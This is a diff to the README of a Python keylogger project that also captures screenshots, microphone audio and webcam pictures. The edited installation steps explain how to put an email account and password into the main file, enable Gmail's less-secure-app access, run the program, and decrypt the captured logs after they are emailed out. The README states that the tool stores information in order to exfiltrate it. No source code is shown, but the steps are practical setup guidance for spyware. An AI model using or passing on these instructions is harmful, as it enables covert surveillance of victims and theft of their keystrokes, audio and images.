@@ -3,16 +3,17 @@ Advanced Keylogger in Python with screenshot, microphone, webcam pictures taking
 
 ## Installation
 1. [Download Python](https://www.python.org/downloads/) and [Install](https://www.w3schools.in/python-tutorial/install/) it.
-2. Make sure all the associated modules are installed. For Installation open Command Prompt & type
+2. Make sure all the associated modules are installed. I've added all the modules in the [requirements.txt](https://github.com/rohitranaqh/Advanced-Keylogger-with-Webcam-and-Microphone-Spy/blob/main/requirements.txt) file.
+3. If any of the module is not in the requirements.txt file then open Command Prompt & type
 ```
 pip install ModuleName
 ```
 5. At **line 96** in the main file enter your full email instead of quitehacker@instagram.com.
 6. At **line 97** in the main file enter the password for that email account.
 7. Make sure in the gmail account settings that the [allow less secure apps](https://support.google.com/accounts/answer/6010255?hl=en#zippy=%2Cif-less-secure-app-access-is-on-for-your-account) is on.
-8. Open up a Command Prompt and Change to the directory the program is placed and execute the main file.
+8. Open up a Command Prompt and Change to the directory the program is placed and execute the [main.py](https://github.com/rohitranaqh/Advanced-Keylogger-with-Webcam-and-Microphone-Spy/blob/main/main.py) file.
 9. Open the graphical file manager and go to the C://Users/Public/Logs directory to watch the program in action.
-10. After files are encrypted and sent to email, download them and place them in the directory specified in decryptFile.py and run the decrypt file in command prompt.
+10. After files are encrypted and sent to email, download them and place them in the directory specified in [decrypt.py](https://github.com/rohitranaqh/Advanced-Keylogger-with-Webcam-and-Microphone-Spy/blob/main/decrypt.py) and run the decrypt file in command prompt.
 
 ## Working:
 * Creates a directory to temporarily store information to exfitrate
